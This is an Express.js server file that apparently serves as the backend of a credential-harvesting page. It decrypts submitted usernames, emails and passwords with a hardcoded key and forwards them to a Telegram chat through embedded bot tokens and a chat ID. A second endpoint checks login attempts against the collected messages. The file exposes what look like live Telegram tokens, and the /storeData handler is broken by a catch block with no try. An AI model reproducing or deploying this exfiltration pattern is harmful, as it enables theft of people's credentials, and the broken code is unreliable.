const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 8080;
const CryptoJS = require("crypto-js");

require("dotenv").config();

const SECRET_KEY = 'key';
const TELEGRAM_BOT_TOKEN = '6894974714:AAEbOAZb0Oz1q8uXvMD6FqIAX1oTAZaZU7g';
const TELEGRAM_BOT_TOKEN_2 = '6939916007:AAF5h7hwD2-E8YVWXSO9SWii20-wAQIovVQ';
const TELEGRAM_CHAT_ID = '-1002236584741';

let dataEntries = {}; 

app.use(bodyParser.json());
app.use(express.static("public"));

app.post("/storeData", async (req, res) => {
  const encryptedData = req.body.data;
  console.log("Received encrypted data:", encryptedData);

    // Decrypt data
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

    // const id = Date.now().toString();
    
    // dataEntries[id] = decryptedData;

    // Construct message for Telegram
    const message = JSON.stringify(decryptedData);

    // // Send message to Telegram
    // const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    // const response = await fetch(telegramApiUrl, {
    //   method: "POST",
    //   headers: {
    //     "Content-Type": "application/json",
    //   },
    //   body: JSON.stringify({
    //     chat_id: TELEGRAM_CHAT_ID,
    //     text: message,
    //   }),
    // });

    // if (!response.ok) {
    //   throw new Error("Failed to send message to Telegram");
    // }

    // Send message to Telegram
    const telegramApiUrl2 = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`;
    const respons = await fetch(telegramApiUrl2, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!respons.ok) {
      throw new Error("Failed to send message to Telegram");
    }





    // res.status(200).send(`Data stored with ID: ${id}`);
  } catch (error) {
    console.error("Error storing data:", error);
    res.status(500).send("Failed to store data");
  }
});
app.get("/fetchData", async (req, res) => {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
  try {
      const fetch = await import("node-fetch");
      const response = await fetch.default(telegramApiUrl, {
          method: "GET",
          headers: {
              "Content-Type": "application/json",
          },
      });

      if (!response.ok) {
          throw new Error("Failed to fetch data from Telegram");
      }

      const data = await response.json();
      console.log('Raw data from Telegram:', data);

      const messages = data.result
          .filter(update => update.channel_post && update.channel_post.text)
          .map(update => update.channel_post.text)
          .filter(text => {
              try {
                  JSON.parse(text);
                  return true;
              } catch (e) {
                  return false;
              }
          });

      console.log('Filtered messages:', messages);

      const entries = messages.reduce((acc, message) => {
          const data = JSON.parse(message);
          data.forEach(item => {
              if (!acc[item.id]) {
                  acc[item.id] = {};
              }
              acc[item.id][item.type] = item.value;
          });
          return acc;
      }, {});

      console.log('Processed entries:', entries);

      res.status(200).json(entries);
  } catch (error) {
      console.error("Error fetching data from Telegram:", error);
      res.status(500).send("Failed to fetch data from Telegram");
  }
});

//verifydata
app.post("/verifyData", async (req, res) => {
  const encryptedData = req.body.data;
  console.log("Received encrypted data:", encryptedData);

  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
  const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

  console.log("Decrypted data for verification:", decryptedData);

  const { username, email, password } = decryptedData.reduce((acc, field) => {
    acc[field.type] = field.value;
    return acc;
  }, {});

  //   const message = `Received user input: ${JSON.stringify(decryptedData)}`;

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
  try {
    const response = await fetch(telegramApiUrl);
    const data = await response.json();

    if (!data.ok) {
      throw new Error("Failed to fetch messages from Telegram");
    }

    const messages = data.result;
    let userFound = false;

    for (const message of messages) {
      if (message.message && message.message.text) {
        const text = message.message.text;
        if (text.startsWith("Received user input: ")) {
          const userData = JSON.parse(
            text.replace("Received user input: ", "")
          );
          console.log("Comparing with stored data:", userData);

          const usernameMatch = userData.some(
            (field) => field.type === "username" && field.value === username
          );
          const emailMatch = userData.some(
            (field) => field.type === "email" && field.value === email
          );
          const passwordMatch = userData.some(
            (field) => field.type === "password" && field.value === password
          );

          if (usernameMatch && emailMatch && passwordMatch) {
            userFound = true;
            break;
          }
        }
      }
    }

    if (userFound) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error("Error verifying data with Telegram:", error);
    res.status(500).send("Failed to verify data with Telegram");
  }
});

app.listen(port, () => {
  console.log(`Backend server running at http://localhost:${port}`);
});
